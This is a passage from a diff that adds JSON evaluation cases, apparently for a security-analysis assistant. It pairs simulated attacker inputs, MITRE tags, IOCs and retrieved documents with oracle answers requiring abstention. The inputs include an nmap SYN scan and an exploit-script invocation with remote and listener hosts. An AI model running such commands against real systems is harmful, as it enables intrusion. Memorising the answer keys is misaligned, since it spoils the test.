+              "retrieval_score": 0.85
+            },
+            {
+              "doc_id": "D3",
+              "title": "Change Management Windows",
+              "content_excerpt": "Scheduled maintenance windows for db-02 cover weekly patching of the base image.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.25
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "CONFLICTING",
+        "allowed_strategies": [
+          "baseline"
+        ],
+        "required_abstain": true,
+        "allowed_evidence_refs": []
+      }
+    },
+    {
+      "case_id": "EV-039",
+      "name": "required_ioc_only_recon",
+      "archetype": "required_ioc_only",
+      "scenario": "recon",
+      "state": {
+        "session": {
+          "current_input": "nmap -sS -Pn -p 1-1024 10.20.83.0/24"
+        },
+        "behavior": {
+          "skill_level": "expert",
+          "confidence": 0.86,
+          "observed_techniques": [
+            "T1046",
+            "T1595"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0043"
+          ],
+          "observed_ttps": [
+            "T1046",
+            "T1595"
+          ],
+          "iocs": [
+            "10.77.225.181"
+          ]
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Capacity Planning Note",
+              "content_excerpt": "Memory headroom guidance for ci-05 recommends a future resize during the next cycle.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.16
+            },
+            {
+              "doc_id": "D2",
+              "title": "Backup Verification",
+              "content_excerpt": "Nightly backup verification for ci-05 completed with no failed volumes.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.29
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "INSUFFICIENT",
+        "allowed_strategies": [
+          "baseline"
+        ],
+        "required_abstain": true,
+        "allowed_evidence_refs": []
+      }
+    },
+    {
+      "case_id": "EV-040",
+      "name": "required_ioc_only_exploitation",
+      "archetype": "required_ioc_only",
+      "scenario": "exploitation",
+      "state": {
+        "session": {
+          "current_input": "python3 CVE-2024-5101.py --rhost 10.20.145.40 --lhost 10.20.145.99"
+        },
+        "behavior": {
+          "skill_level": "intermediate",
+          "confidence": 0.61,
+          "observed_techniques": [
+            "T1059.004"
+          ]
+        },
+        "don_analysis": {
+          "severity": "critical",
+          "tactics": [
+            "TA0001"
+          ],
+          "observed_ttps": [
+            "T1059.004"
+          ],
+          "iocs": [
+            "10.77.70.74"
+          ]
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Backup Verification",
+              "content_excerpt": "Nightly backup verification for file-03 completed with no failed volumes.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.26
+            },
+            {
+              "doc_id": "D2",
+              "title": "Capacity Planning Note",
+              "content_excerpt": "Memory headroom guidance for file-03 recommends a future resize during the next cycle.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.19
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "INSUFFICIENT",
+        "allowed_strategies": [
+          "baseline"
+        ],
+        "required_abstain": true,
+        "allowed_evidence_refs": []
+      }
+    }
+  ]
+}
